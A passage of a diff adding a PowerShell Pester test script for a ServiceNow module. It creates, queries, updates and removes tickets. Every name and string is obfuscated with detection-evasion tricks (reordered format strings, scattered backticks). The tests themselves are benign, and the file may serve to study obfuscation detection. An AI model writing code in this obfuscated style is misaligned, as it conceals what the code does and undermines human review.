@@ -1,0 +1,316 @@
+[CmdletBinding()]
+Param(
+    [Parameter(maNDatOrY = ${tR`UE})]
+    [ValidateNotNullorEmpty()]
+    [PSCredential]${Cr`Ed`eN`TiAL}
+)
+
+${P`RojEct`RO`OT} = &("{2}{0}{1}"-f've-Pa','th','Resol') "$PSScriptRoot\.."
+${MOd`Ul`ero`ot} = &("{0}{1}{2}"-f 'Sp','lit-','Path') (&("{2}{0}{1}"-f'esolv','e-Path','R') "$ProjectRoot\*\*.psd1")
+${mODUl`eNA`ME} = &("{3}{1}{2}{0}" -f 'h','it-P','at','Spl') ${mO`DuLER`oOt} -Leaf
+${mOD`ULep`sd} = (&("{1}{0}{3}{2}" -f 'esolve-','R','ath','P') "$ProjectRoot\*\$ModuleName.psd1")."P`Ath"
+${M`Odu`LePSm} = (&("{0}{3}{1}{2}" -f 'Reso','v','e-Path','l') "$ProjectRoot\*\$ModuleName.psm1")."P`AtH"
+${defaU`ltSF`i`LE} = &("{1}{2}{0}"-f'ath','Join-','P') ${P`RojEctR`oOT} "Tests\$($ModuleName).Pester.Defaults.json"
+
+${MOdUleLO`A`DED} = &("{2}{3}{1}{0}"-f'dule','o','Get','-M') ${Mo`dulEN`AME}
+If (${Nu`LL} -eq ${M`Od`Ule`l`OADeD}) {
+    &("{3}{2}{0}{1}" -f 'u','le','mport-Mod','I') ${m`O`DUlE`PSd} -Force
+}
+ElseIf (${nU`LL} -ne ${MOD`U`lEl`oAD`ed} -and ${mo`duLe`L`oaD`Ed} -ne ${Mo`dulE`PSm}) {
+    &("{1}{0}{4}{3}{2}"-f 'v','Remo','ule','-Mod','e') ${ModU`L`E`NaME} -Force -ErrorAction ("{3}{2}{1}{4}{0}"-f 'ntlyContinue','l','i','S','e')
+    &("{1}{0}{3}{2}"-f 'mp','I','rt-Module','o') ${mOdU`l`epSd} -Force
+}
+
+
+If (&("{2}{0}{1}" -f 'Pa','th','Test-') ${DEfa`ULtS`Fi`lE}) {
+    ${sCRI`PT:D`EFAu`lTS} = &("{2}{3}{0}{1}" -f'o','ntent','Ge','t-C') ${d`Ef`AULtSfile} -Raw | &("{3}{2}{0}{1}{4}" -f 't','From-Js','nver','Co','on')
+
+    If (("{3}{1}{2}{5}{0}{4}" -f'ervice-now.','st','ingur','te','com','l.s') -eq ${Def`Au`lTS}."SerViC`eN`OW`Url") {
+        Throw ("{5}{7}{8}{14}{3}{6}{13}{0}{9}{4}{12}{15}{2}{11}{1}{10}" -f'ste','yo','th','e t','efaults.','P','he *.','le','ase popula','r.D','ur values',' ','json file','Pe','t',' wi')
+    }
+}
+Else {
+    
+    @{
+        ("{2}{1}{0}" -f 'RL','NowU','Service') = ("{1}{4}{2}{0}{3}"-f 'ice-now.c','tes','url.serv','om','ting')
+        ("{0}{1}{2}{3}" -f 'TestCa','te','go','ry')  = ("{2}{0}{1}" -f'er','nal','Int')
+        ("{0}{2}{3}{1}" -f 'Test','Group','Use','r') = ("{3}{7}{4}{5}{1}{6}{2}{0}"-f'7','4baf','7aa','8a4dd','2780','17a6a','54','e73c6112')
+        ("{1}{2}{0}" -f'er','Te','stUs')      = ("{6}{1}{2}{4}{7}{0}{3}{5}"-f'401c5a','6f7','9c','33be04be44','c','1','681','0a8016')
+    } | &("{1}{2}{3}{0}" -f'on','Co','nvert','To-Js') | &("{3}{0}{2}{1}"-f'e','-Content','t','S') ${DEfAu`lt`SFI`le}
+    Throw ("$DefaultsFile "+'do'+'es '+'not'+' '+'exi'+'s'+'t. '+'Crea'+'t'+'ed '+'exam'+'ple'+' '+'fi'+'le. '+'Ple'+'a'+'se '+'popu'+'l'+'ate '+'wit'+'h '+'yo'+'ur '+'valu'+'es')
+}
+
+&("{0}{2}{1}"-f 'Descr','e','ib') ("{3}{1}{2}{0}"-f'dule','-','Mo','ServiceNow') {
+    
+    If (&("{0}{2}{4}{6}{5}{7}{1}{3}" -f'Te','S','st','et','-Service','owAut','N','his')) {
+        &("{0}{4}{1}{3}{2}"-f'R','e','th','NowAu','emove-Servic')
+    }
+
+    
+    &('It') ("{6}{5}{3}{7}{4}{0}{9}{1}{2}{10}{8}"-f'Conn','n ','connec',' has','st-','url','ServiceNow ',' Te','ty','ectio','tivi') {
+        &("{3}{2}{0}{1}"-f't-Connecti','on','es','T') ${d`e`F`AuLtS}."se`Rv`IcENOwUrl" -Quiet | &("{0}{2}{1}" -f'S','ould','h') -Be ${t`RuE}
+    }
+
+    
+    &('It') ("{0}{1}{7}{6}{5}{3}{2}{4}"-f'Test-Servi','ceN','s','not ','et','sSet ','hI','owAut') {
+        &("{5}{4}{0}{1}{3}{2}" -f'Servic','eNo','Set','wAuthIs','t-','Tes') | &("{0}{1}" -f 'Sh','ould') -Be ${faL`sE}
+    }
+
+    &('It') ("{3}{1}{0}{2}{6}{4}{5}"-f 't','ServiceNowAu','h wo','Set-','k','s','r') {
+        &("{1}{0}{2}{3}"-f'e','Set-Servic','NowAu','th') -url ${d`efAULTS}."SerVic`E`NoWu`RL" -Credentials ${c`REDeNTi`Al} | &("{0}{1}" -f'Shoul','d') -Be ${t`RUE}
+    }
+
+    &('It') ("{5}{3}{1}{2}{4}{6}{8}{0}{7}" -f'IsSet se','-','Ser','t','viceN','Tes','o','t','wAuth') {
+        &("{2}{4}{1}{5}{0}{3}"-f'hI','st-ServiceNowA','T','sSet','e','ut') | &("{0}{1}{2}"-f'Sh','o','uld') -Be ${TR`UE}
+    }
+
+    
+    &('It') ("{1}{0}{2}{4}{5}{6}{3}{7}" -f'Servic','Get-','eNowTab','reco','le',' r','eturns ','rds') {
+        ([array](&("{0}{5}{3}{1}{4}{2}"-f'Ge','w','ble','viceNo','Ta','t-Ser') -Table ("{0}{2}{1}"-f'i','t','nciden') -Query ("{2}{3}{0}{1}" -f'BYDESCop','ened_at','OR','DER')))."CO`UNT" -gt 0  | &("{1}{0}"-f'd','Shoul') -Match ${t`RUE}
+    }
+
+    &('It') ("{10}{2}{6}{1}{9}{11}{3}{0}{7}{12}{5}{8}{17}{4}{13}{16}{15}{14}"-f'h Sp','wTab','Servic','it','s','elds p','eNo','ecifyCo','ar','l','Get-','e w','nnectionFi','et','ns records','r',' retu','am ') {
+        ${gEtsERViCeNo`wt`A`Bl`Es`Pl`AT} = @{
+            ("{0}{1}"-f 'T','able')                = ("{0}{1}{2}"-f 'incid','e','nt')
+            ("{0}{1}" -f'Q','uery')                = ("{1}{3}{2}{5}{4}{0}" -f'at','O','SC','RDERBYDE','ed_','open')
+            ("{2}{0}{1}" -f'eden','tial','Cr')           = ${C`ReDEn`TIaL}
+            ("{2}{3}{0}{1}{4}"-f 'iceNo','wU','Se','rv','RL')        = ${DEfa`Ul`Ts}."SER`V`I`cEN`owuRL"
+        }
+        ([array](&("{2}{4}{1}{0}{3}"-f'ceNow','i','Get-S','Table','erv') @getServiceNowTableSplat))."Co`Unt" -gt 0  | &("{1}{0}" -f'uld','Sho') -Match ${TR`Ue}
+    }
+
+    &('It') ("{5}{6}{3}{4}{8}{7}{0}{1}{2}"-f'r','y returns record','s','Se','rvic','Ge','t-','nt','eNowTableE') {
+        ([array](&("{0}{2}{3}{5}{4}{1}{6}" -f'Get-','t','Serv','ice','owTableEn','N','ry') -Table ("{1}{2}{0}" -f 'nt','incid','e')))."cO`UnT" -gt 0 | &("{0}{1}" -f 'S','hould') -Match ${Tr`UE}
+    }
+
+    &('It') ("{2}{1}{8}{0}{3}{7}{4}{6}{5}" -f 't retu','-ServiceNowInci','Get','r','s reco','s','rd','n','den') {
+        ([array](&("{0}{4}{3}{2}{1}{6}{5}"-f 'Get-S','In','ceNow','rvi','e','nt','cide')))."cOu`NT" -gt 0 | &("{0}{1}"-f'S','hould') -Match ${T`RuE}
+    }
+
+    &('It') ("{2}{5}{6}{1}{4}{0}{3}{9}{8}{7}" -f'quest','rviceN','G',' re','owRe','et-S','e',' records','urns','t') {
+        ([array](&("{0}{2}{4}{1}{3}"-f'Get-Se','qu','rvi','est','ceNowRe')))."cou`NT" -gt 0 | &("{1}{0}"-f 'd','Shoul') -Match ${tR`Ue}
+    }
+
+    &('It') ("{9}{8}{4}{7}{2}{1}{0}{10}{5}{6}{3}"-f 'que','Re','ow','rns records','ervic','tem ','retu','eN','et-S','G','stI') {
+        ([array](&("{0}{4}{2}{3}{1}"-f'Get','em','s','tIt','-ServiceNowReque')))."Cou`NT" -gt 0 | &("{1}{0}" -f'ould','Sh') -Match ${t`Rue}
+    }
+
+    &('It') ("{4}{0}{5}{3}{2}{1}"-f'o',' works','p','u','Get-ServiceN','wUserGro') {
+        (&("{5}{0}{3}{1}{4}{2}" -f 'rvi','Now','up','ce','UserGro','Get-Se'))."C`Ount" -gt 0 | &("{0}{1}" -f 'Sho','uld') -Match ${TR`UE}
+    }
+
+    &('It') ("{3}{4}{5}{6}{0}{2}{1}"-f's','works','er ','Get','-','ServiceNow','U') {
+        (&("{2}{3}{1}{0}{4}{5}" -f 'ow','rviceN','Get-S','e','U','ser'))."cO`UNt" -gt 0 | &("{0}{1}" -f 'Sh','ould') -Match ${t`Rue}
+    }
+
+    &('It') ("{1}{0}{7}{6}{2}{10}{8}{9}{3}{5}{4}" -f 'o','Get-ServiceNowC','g','ionIte',' works','m','fi','n','r','at','u') {
+        (&("{3}{0}{1}{4}{5}{2}"-f'w','Confi','tem','Get-ServiceNo','guration','I'))."CO`UnT" -gt 0 | &("{0}{1}"-f'Sh','ould') -Match ${T`RUE}
+    }
+
+    &('It') ("{4}{1}{3}{0}{5}{2}" -f 'owChangeRequest','-Servic','rks','eN','Get',' wo') {
+        (&("{1}{5}{4}{0}{3}{2}"-f'viceNowChange','Ge','equest','R','Ser','t-'))."C`oUNT" -gt 0 | &("{1}{0}"-f 'uld','Sho') -Match ${tR`UE}
+    }
+
+    
+    &('It') (("{2}{7}{14}{12}{4}{15}{1}{13}{6}{10}{5}{3}{8}{0}{11}{9}" -f'y) wor','n','Ne','owTab',' (and','N','e','w-Se','leEntr','s','rvice','k','Incident',' New-S','rviceNow',' by extensio')) {
+        ${SH`O`RtD`e`SCR`IptIon} = ("{1}{4}{2}{5}{3}{0}{7}{9}{8}{6}{10}" -f 'Creation ','Testin',' T','t ','g','icke','st','with','e',' P','er')
+        ${NEWServ`iC`eNoWIN`CiDENtSP`lAt} = @{
+            ("{2}{0}{1}"-f 'a','ller','C')              = ${DEf`A`U`LtS}."tEs`TuSer"
+            ("{1}{4}{2}{0}{3}" -f 'crip','Shor','es','tion','tD')    = ${sHoRtd`Esc`RIPtI`ON}
+            ("{2}{0}{1}"-f'scripti','on','De')         = ("{4}{0}{3}{1}{2}" -f'ng','cri','ption',' des','Lo')
+            ("{2}{1}{0}" -f'mentGroup','n','Assig')     = ${D`EFaU`LTS}."t`EsTu`SeR`GRoUp"
+            ("{2}{1}{0}"-f 'nt','omme','C')             = ("{0}{2}{1}"-f 'Com','ent','m')
+            ("{0}{1}" -f 'Categ','ory')            = ${dEF`Au`LTs}."tEstcA`TEG`orY"
+            ("{0}{3}{1}{2}"-f 'SubC','te','gory','a')         = ${d`EFAu`L`Ts}."tEStsuB`c`AT`EGOry"
+            ("{0}{3}{5}{4}{2}{1}"-f'C','ionItem','rat','on','u','fig')   = ${DEfA`U`LTs}."tESt`cO`NFI`guratIONitE"
+        }
+        ${t`eSttI`C`kET} = &("{3}{5}{4}{2}{0}{1}{6}"-f'No','wIn','e','N','-Servic','ew','cident') @newServiceNowIncidentSplat
+
+        ${Te`stt`ICk`Et}."shOR`T_DeS`cR`Ip`TioN" | &("{2}{1}{0}"-f'ld','ou','Sh') -Be ${SHORT`D`ESc`RI`ption}
+    }
+
+    
+    &('It') ("{1}{6}{2}{3}{8}{0}{4}{7}{5}" -f 'ChangeR','Updat','erv','iceNo','eq','orks','e-S','uest w','w') {
+        ${tEStT`i`CKet} = &("{5}{7}{0}{2}{1}{4}{6}{3}" -f 'g','e','eR','t','q','Get-ServiceNow','ues','Chan') -First 1
+
+        ${va`lu`eS} = @{
+            ("{2}{0}{3}{1}"-f't','on','descrip','i') = ("{8}{0}{4}{2}{1}{5}{7}{3}{6}" -f't','ate-Se','nt:  Upd','wor','er Comme','rv','ks','iceNowChangeRequest ','Pes')
+        }
+
+        ${upDa`TeSErvi`CE`NowN`UMbEr`SpLAt} = @{
+            ("{1}{0}"-f'ysID','S')  = ${tes`TTi`cK`eT}."SYs`_iD"
+            ("{0}{1}"-f 'Valu','es') = ${Val`U`es}
+        }
+        ${UPd`ATeDT`I`cKET} = &("{3}{2}{1}{4}{0}{5}"-f 'Reque','a','date-ServiceNowCh','Up','nge','st') @updateServiceNowNumberSplat
+
+        ${UPDAt`edT`iC`kEt}."D`e`sc`RIpTion" | &("{0}{1}" -f'Sho','uld') -Be ("{2}{0}{5}{6}{9}{7}{10}{4}{8}{1}{11}{3}" -f 'est','e','P','rks','ceNowC','er',' Comment: ','Ser','hangeRequ',' Update-','vi','st wo')
+
+        ${v`A`lues} = @{
+            ("{2}{1}{0}{3}"-f 'ip','escr','d','tion') = ${TES`TTICk`ET}."des`c`RiPtiOn"
+        }
+
+        ${uPD`Ate`seRv`ICen`ow`N`Umbers`p`LAT} = @{
+            ("{1}{0}" -f 'ysID','S')  = ${Te`s`TTICKEt}."syS_`id"
+            ("{0}{1}"-f'Value','s') = ${V`Al`UEs}
+        }
+        ${nu`LL} = &("{4}{6}{3}{2}{7}{0}{1}{5}" -f 'Chan','geReq','ceN','Servi','Updat','uest','e-','ow') @updateServiceNowNumberSplat
+
+    }
+
+    &('It') ("{3}{5}{0}{2}{4}{1}" -f'viceN','s','owIncident ','Update','work','-Ser') {
+        ${sHor`TDe`S`C`RiPTION} = ("{3}{4}{5}{6}{2}{1}{0}" -f ' Pester','ith',' w','Testing ','Tic','ke','t Update')
+        ${nEWsE`R`ViC`ENoWiN`cidenTS`pLAT} = @{
+            ("{1}{0}"-f 'ller','Ca')              = ${De`F`A`UlTs}."T`eStuS`Er"
+            ("{2}{1}{3}{0}"-f 'on','rip','ShortDesc','ti')    = ${Sh`or`TdESC`RI`pTioN}
+            ("{3}{0}{1}{2}"-f'esc','ri','ption','D')         = ("{2}{4}{3}{1}{0}"-f 'iption','g descr','L','n','o')
+            ("{0}{1}{3}{2}"-f'Ass','ign','ntGroup','me')     = ${D`Ef`Aul`TS}."Te`s`TusERGroUp"
+            ("{2}{0}{1}" -f'om','ment','C')             = ("{1}{0}{2}" -f 'omme','C','nt')
+            ("{0}{1}" -f'Categ','ory')            = ${De`FA`UlTS}."test`Ca`TE`Gory"
+            ("{1}{2}{0}{3}"-f'teg','S','ubCa','ory')         = ${def`Aul`Ts}."tESts`U`BCAT`eGOry"
+            ("{4}{2}{0}{3}{1}" -f 'ura','nItem','onfig','tio','C')   = ${dEf`A`UltS}."TesTCONFi`g`UR`A`T`Io`NiTEm"
+        }
+        ${Tes`TtIc`KET} = &("{6}{2}{0}{5}{1}{4}{3}" -f 'vic','wI','-Ser','t','nciden','eNo','New') @newServiceNowIncidentSplat
+
+        ${T`ESTtI`c`ket}."S`ho`RT_`dEsCRIp`TiON" | &("{1}{0}" -f 'ould','Sh') -Be ${s`hOrt`dEScri`P`Ti`on}
+
+        ${va`Lu`es} = @{
+            ("{3}{1}{0}{2}" -f 'p','scri','tion','short_de') = ("{4}{3}{5}{2}{0}{1}" -f 'est','er','ted with P','ket Upd','Tic','a')
+            ("{2}{0}{1}"-f'rip','tion','desc') = ("{5}{4}{2}{1}{3}{0}" -f'ription','g','on','er Desc',' L','Even')
+        }
+
+        ${n`UlL} = &("{1}{5}{4}{3}{6}{2}{0}"-f 'Incident','U','eNow','e-','at','pd','Servic') -SysId ${teSt`Tic`keT}."s`yS_Id" -Values ${vAl`U`Es}
+
+        ${t`E`sttIC`keT} = &("{3}{0}{2}{5}{1}{4}" -f '-S','cide','erviceNo','Get','nt','wIn') -MatchExact @{("{0}{1}"-f'sys','_id')=${TeS`TTI`Ck`ET}."SY`S_`iD"}
+        ${T`ESttiC`KeT}."shoRt_dE`sCRiPt`i`On" | &("{1}{0}" -f 'd','Shoul') -Be ("{0}{1}{5}{3}{2}{4}"-f'Ticket Upd','at','e',' Pest','r','ed with')
+        ${TES`Tt`iCk`ET}."DeSCr`i`p`TiOn" | &("{1}{0}"-f 'uld','Sho') -Be ("{4}{2}{6}{3}{0}{1}{5}" -f'er Des','c','n','g','Eve','ription',' Lon')
+    }
+
+    &('It') ("{1}{4}{5}{0}{7}{2}{3}{6}{8}" -f 'Now','Updat','umber ','wor','e-Serv','ice','k','N','s') {
+        ${sHoRtd`es`C`RiPt`iON} = ("{4}{3}{0}{6}{5}{2}{1}"-f'et Upd','er','with Pest','ng Tick','Testi','te ','a')
+        ${Ne`wseRv`Ic`eNoW`i`NCI`dENTsPl`AT} = @{
+            ("{0}{1}"-f 'Calle','r')              = ${D`EfAuLtS}."tEsT`U`SeR"
+            ("{1}{2}{3}{0}{4}" -f 'ptio','Sh','ort','Descri','n')    = ${SHo`RT`de`ScR`IPTI`oN}
+            ("{0}{2}{1}" -f'Descripti','n','o')         = ("{0}{3}{4}{1}{2}" -f 'Lon','i','on','g desc','ript')
+            ("{1}{2}{3}{0}"-f 'oup','Ass','ignme','ntGr')     = ${D`EfAu`lTs}."T`e`STUSeRg`ROuP"
+            ("{0}{1}"-f 'C','omment')             = ("{2}{0}{1}" -f 'omme','nt','C')
+            ("{1}{2}{0}"-f 'gory','Ca','te')            = ${def`AUL`TS}."tEst`Ca`TE`goRY"
+            ("{3}{1}{2}{0}"-f 'egory','ubC','at','S')         = ${DE`FAU`ltS}."T`esT`sUbcATE`G`oRy"
+            ("{2}{3}{1}{0}" -f 'nItem','o','Co','nfigurati')   = ${DEFAUL`Ts}."tEStcO`NF`IgU`RA`TionI`T`EM"
+        }
+        ${teSt`TI`CKEt} = &("{1}{0}{4}{2}{3}{5}"-f'-Ser','New','ceN','ow','vi','Incident') @newServiceNowIncidentSplat
+
+        ${T`ESt`TickEt}."S`hORt_DESc`RI`pt`ion" | &("{2}{0}{1}" -f'l','d','Shou') -Be ${sHORT`DESC`Ri`Pt`I`ON}
+
+        ${VAL`UeS} = @{
+            ("{0}{5}{3}{2}{4}{1}" -f'sho','n','p','ri','tio','rt_desc') = ("{10}{2}{1}{0}{7}{6}{9}{4}{3}{5}{8}"-f'h ','wit','ed ','at','pd','e-Servic','er (','Pest','eNowNumber)','U','Ticket Updat')
+            ("{0}{1}{2}{3}"-f 'd','e','scriptio','n')       = ("{5}{3}{0}{1}{7}{2}{8}{6}{4}"-f 'ester t','e','te-ServiceNowNumbe','dated by P','s','Up',' work','st Upda','r')
+        }
+
+        ${uPD`A`TEsErV`ICe`N`o`w`Nu`mbERspLaT} = @{
+            ("{1}{0}{2}" -f 'umb','N','er') = ${t`es`TTIcKET}."NUM`BER"
+            ("{1}{0}"-f 'ble','Ta')  = ("{0}{1}"-f 'i','ncident')
+            ("{0}{2}{1}" -f'Va','ues','l') = ${va`LUes}
+        }
+        &("{3}{0}{1}{5}{2}{6}{4}"-f'date-','Service','N','Up','r','Now','umbe') @updateServiceNowNumberSplat
+
+        ${tES`TTI`cK`Et} = &("{6}{0}{5}{4}{3}{2}{1}" -f't','t','iden','nc','ServiceNowI','-','Ge') -MatchExact @{("{0}{1}{2}"-f 'sys','_','id')=${T`Estt`ICKeT}."syS_`id"}
+        ${tEstT`ICK`ET}."S`H`OrT_`desCrIPtIoN" | &("{1}{0}"-f'ould','Sh') -Be ("{4}{13}{14}{9}{11}{5}{6}{3}{10}{8}{2}{1}{0}{15}{7}{12}" -f'w','o','N','e-','Ticket Update',' ','(Updat','mb','rvice','st','Se','er','er)','d ','with Pe','Nu')
+        ${t`EST`TIckET}."dEsc`Ri`pT`ioN" | &("{0}{1}{2}" -f'Sh','oul','d') -Be ("{2}{0}{4}{7}{8}{3}{1}{6}{5}" -f 'pdated by ','eNowNumb','U','c','Pester test Updat','ks','er wor','e-Ser','vi')
+    }
+
+    &('It') ("{7}{6}{5}{8}{2}{9}{0}{10}{12}{4}{14}{11}{13}{1}{3}" -f'wNumb','s work','N','s','Sp','ate-Ser','d','Up','vice','o','er wit','ifyConnect','h ','ionField','ec') {
+        ${s`HortdeSc`RIpTI`on} = ("{5}{8}{2}{1}{7}{6}{3}{4}{0}" -f 'ster','a',' Upd','h ','Pe','Testing ','wit','te ','Ticket')
+        ${newS`Er`VICEn`O`WI`NC`iDEn`T`sPLAT} = @{
+            ("{0}{1}"-f 'Calle','r')              = ${dEf`AU`lTS}."tEStu`SeR"
+            ("{2}{3}{1}{0}"-f 'n','scriptio','Sh','ortDe')    = ${SHOrTd`esC`RI`PTiOn}
+            ("{3}{0}{1}{2}"-f 'c','rip','tion','Des')         = ("{0}{3}{1}{2}" -f 'Long ','ipt','ion','descr')
+            ("{2}{4}{3}{0}{1}" -f'tGr','oup','A','men','ssign')     = ${defau`Lts}."T`e`st`UsergR`Oup"
+            ("{1}{0}"-f'ment','Com')             = ("{1}{0}"-f'ment','Com')
+            ("{2}{1}{0}"-f 'ory','g','Cate')            = ${D`efa`ULtS}."tesTC`AT`eGOry"
+            ("{0}{1}{2}"-f'Su','bC','ategory')         = ${d`Efa`Ul`Ts}."TeSTSUbc`Ate`gORY"
+            ("{3}{1}{2}{0}"-f'm','urati','onIte','Config')   = ${de`FaUL`Ts}."t`eS`TCONfIg`U`Ra`TIoN`ITEM"
+        }
+        ${t`EsT`TiC`KET} = &("{2}{1}{4}{3}{0}" -f 't','ice','New-Serv','nciden','NowI') @newServiceNowIncidentSplat
+
+        ${tESt`T`ic`Ket}."sHOR`T_`D`eSCRIpti`oN" | &("{1}{0}"-f'uld','Sho') -Be ${ShORTD`esC`RIPT`ioN}
+
+        ${Val`U`eS} = @{
+            ("{0}{3}{1}{4}{2}"-f 'shor','_descri','on','t','pti') = ("{4}{7}{8}{3}{2}{6}{5}{11}{0}{10}{1}{9}" -f'rviceNo','r','da','Pester (Up','Ticket Update','e-','t','d ','with ',')','wNumbe','Se')
+            ("{1}{3}{2}{0}" -f'ription','de','c','s')       = ("{3}{8}{10}{11}{7}{1}{9}{2}{0}{5}{12}{13}{6}{14}{4}" -f'owNum','t Upd','eN','Updated by P','rks','b','onn','tes','es','ate-Servic','t','er ','er with Speci','fyC','ectionFields wo')
+        }
+
+        ${UpdA`TE`SErv`ice`NOW`NuMber`SPLat} = @{
+            ("{1}{0}{2}" -f 'umb','N','er')        = ${Tes`T`T`ICkeT}."NUMb`ER"
+            ("{0}{1}"-f 'Tab','le')         = ("{1}{2}{0}"-f 'ent','inci','d')
+            ("{0}{1}" -f 'Va','lues')        = ${V`ALuEs}
+            ("{1}{2}{0}" -f'ential','Cre','d')    = ${c`REdEn`T`IAL}
+            ("{3}{2}{1}{0}" -f 'URL','w','viceNo','Ser') = ${D`EF`AUL`TS}."SeRV`ICENOW`URl"
+        }
+        &("{5}{4}{1}{3}{2}{0}" -f'r','ceNo','mbe','wNu','te-Servi','Upda') @updateServiceNowNumberSplat
+
+        ${T`EStT`iCK`ET} = &("{2}{1}{4}{0}{3}{5}" -f'r','et-','G','vi','Se','ceNowIncident') -MatchExact @{("{1}{0}" -f '_id','sys')=${Test`T`I`ckET}."SYs_`Id"}
+        ${tEsTt`I`CK`ET}."SHORt_`dE`SCr`IptiOn" | &("{1}{0}"-f 'hould','S') -Be (("{9}{0}{4}{1}{7}{5}{2}{8}{10}{6}{3}" -f'ed with Pester ','ate','rvice','er)','(Upd','Se','wNumb','-','N','Ticket Updat','o'))
+        ${T`es`TtIck`Et}."d`Esc`Rip`TiON" | &("{2}{1}{0}" -f'd','oul','Sh') -Be ("{4}{0}{9}{14}{8}{15}{10}{6}{7}{5}{1}{2}{3}{11}{13}{12}"-f'ated ',' Specif','yC','o','Upd',' with','NowNum','ber','t Update-Ser','by','e','nnec','orks','tionFields w',' Pester tes','vic')
+    }
+
+    &('It') ("{3}{2}{7}{1}{6}{0}{5}{4}"-f ' No P','es','ervice','Update-S','ru works','assTh','tItem','NowRequ') {
+        
+        ${tE`ST`T`ICKEt} = &("{6}{5}{4}{2}{3}{1}{0}{7}" -f 'Ite','t','wReque','s','No','et-Service','G','m') -MatchExact @{("{0}{1}"-f 'n','umber')=("{3}{2}{1}{0}"-f '1','00','000','RITM0');("{4}{3}{2}{0}{1}"-f 'riptio','n','desc','hort_','s')=("{2}{0}{1}" -f 'Pa','d 3','Apple i');("{1}{0}" -f'te','sta')=1} -ErrorAction ("{2}{1}{4}{0}{3}"-f'i','entlyCo','Sil','nue','nt')
+        ${t`Es`TtICKeT}."num`BER" | &("{0}{1}{2}" -f 'S','hou','ld') -Be ("{0}{1}{2}"-f'RIT','M0000','001') -Because ("{18}{17}{3}{15}{5}{8}{4}{13}{1}{19}{16}{2}{10}{7}{14}{11}{12}{9}{6}{0}" -f '01',' a ','eNow ','est',' i','r','00','e','ks','for RITM000','develop','anc','e ','n','r inst',' only wo','rvic','s t','Thi','Se')
+
+        ${Valu`es} = @{
+            ("{2}{0}{3}{1}"-f 'scri','tion','de','p') = ("{16}{3}{9}{6}{1}{13}{8}{4}{17}{0}{10}{2}{5}{15}{14}{12}{11}{7}" -f 'e-Service','ter ','q','by','pd','u','Pes','Thru works','est U',' ','NowRe','ss','o Pa','t',' N','estItem','Updated ','at')
+        }
+
+        ${c`OM`ManD`OUTPut} = &("{1}{3}{4}{2}{6}{0}{7}{5}" -f'erviceNow','Up','-','da','te','m','S','RequestIte') -SysId ${TeStt`ic`K`eT}."sY`S_`Id" -Values ${vA`LUeS}
+
+        ${test`TIc`Ket} = &("{1}{2}{5}{7}{6}{4}{3}{0}" -f 'tem','Get-Servic','e','I','est','NowRe','u','q') -MatchExact @{("{0}{1}" -f 'sy','s_id')=${TesTti`C`K`Et}."s`yS_id"}
+        ${TE`S`TtiCkEt}."DE`sc`RIpT`IoN" | &("{1}{0}" -f 'd','Shoul') -Be ("{3}{6}{1}{8}{9}{0}{11}{7}{12}{15}{14}{16}{5}{13}{4}{2}{10}" -f 'ste','te',' ','U','PassThru',' N','pda','rvic','d b','y Pe','works','r test Update-Se','eNo','o ','equest','wR','Item')
+        ${COmMAN`DoUtp`UT} | &("{0}{1}"-f 'Shou','ld') -BeNullOrEmpty
+    }
+
+    &('It') ("{11}{7}{14}{6}{15}{9}{8}{4}{0}{5}{1}{3}{16}{10}{12}{13}{2}"-f 'n','e','works','lds and','o','nectionFi','tem with Speci','e-ServiceNowReq','C','y','a','Updat','ss','Thru ','uestI','f',' P') {
+        
+        ${Tes`Tt`iC`KET} = &("{0}{3}{1}{5}{6}{4}{2}" -f 'Get','Ser','stItem','-','eque','viceNow','R') -MatchExact @{("{2}{1}{0}" -f'mber','u','n')=("{1}{2}{0}" -f '01','RITM','00000');("{2}{3}{5}{4}{1}{0}" -f 'n','tio','s','ho','escrip','rt_d')=("{3}{1}{0}{2}" -f 'ad ','e iP','3','Appl');("{0}{1}" -f'sta','te')=1} -ErrorAction ("{2}{1}{3}{4}{0}"-f'ontinue','lent','Si','l','yC')
+        ${tEs`TTiCk`ET}."NumB`er" | &("{0}{1}" -f'Shoul','d') -Be ("{0}{1}{2}"-f'RITM0000','00','1') -Because ("{2}{3}{6}{1}{13}{14}{9}{12}{10}{15}{5}{0}{8}{11}{4}{7}" -f'TM','ly wo','Th','is te','0','RI','st on','0001','0','eNow ','oper ','0','devel','rks in ','a Servic','instance for ')
+
+        ${Val`U`es} = @{
+            ("{1}{2}{3}{0}" -f'n','desc','ri','ptio') = ("{15}{11}{3}{8}{0}{2}{4}{12}{13}{1}{9}{7}{6}{10}{5}{14}" -f ' Pest','i','er test Upd','te','a','elds wo','onnection','estItem with SpecifyC','d by','ceNowRequ','Fi','da','te-S','erv','rks','Up')
+        }
+
+        ${Up`dATEser`Vic`e`NowRE`quEstitEMsp`laT} = @{
+            ("{0}{1}"-f 'SysI','D')         = ${t`e`sT`TickEt}."Sys`_id"
+            ("{2}{0}{1}"-f'alu','es','V')        = ${Val`UES}
+            ("{2}{0}{1}" -f 'den','tial','Cre')    = ${cR`Eden`T`IAL}
+            ("{0}{3}{1}{2}" -f'Servic','R','L','eNowU') = ${d`e`F`AulTS}."seR`ViC`e`NOwU`RL"
+            ("{2}{0}{1}"-f'ass','Thru','P')      = ${T`Rue}
+        }
+        ${coM`MA`NdOuTpUT} = &("{0}{3}{5}{6}{1}{4}{7}{2}" -f'U','ues','tem','pdate-Servic','t','eNowRe','q','I') @updateServiceNowRequestItemSplat
+
+        ${TeSt`Ti`cKet} = &("{0}{2}{4}{3}{1}{5}{7}{6}"-f'Get','rviceNowReq','-','e','S','ue','m','stIte') -MatchExact @{("{0}{1}"-f 'sys','_id')=${te`St`TiCKeT}."s`ys_`ID"}
+        ${teStTi`ck`et}."Des`C`Ri`PtioN" | &("{0}{1}" -f 'Shoul','d') -Be ("{8}{19}{12}{18}{20}{17}{3}{6}{22}{0}{23}{4}{13}{21}{15}{7}{16}{9}{11}{10}{2}{5}{1}{14}"-f 'qu','r','Fields','date-Servi','tem ',' wo','ceNow','h','Updated by','ec','n','ifyConnectio','ter te','w','ks','t',' Sp','Up','s',' Pes','t ','i','Re','estI')
+        ${ComMa`NDou`TpUt} | &("{0}{2}{1}"-f'Shou','d','l') -Not -BeNullOrEmpty
+    }
+
+    
+    &('It') ("{2}{4}{8}{1}{7}{6}{5}{3}{0}" -f'ble works','rv','R','wTa','emove','eNo','c','i','-Se') {
+        ${tES`TTIC`KEt} = &("{3}{0}{4}{2}{1}"-f 'wI','dent','i','Get-ServiceNo','nc') -First 1
+        ${reMoVese`Rv`iCENOwtA`Bl`eE`N`TrYSpLAT} = @{
+            ("{0}{1}" -f'Sys','Id') = ${TEStT`iCk`eT}."s`yS_id"
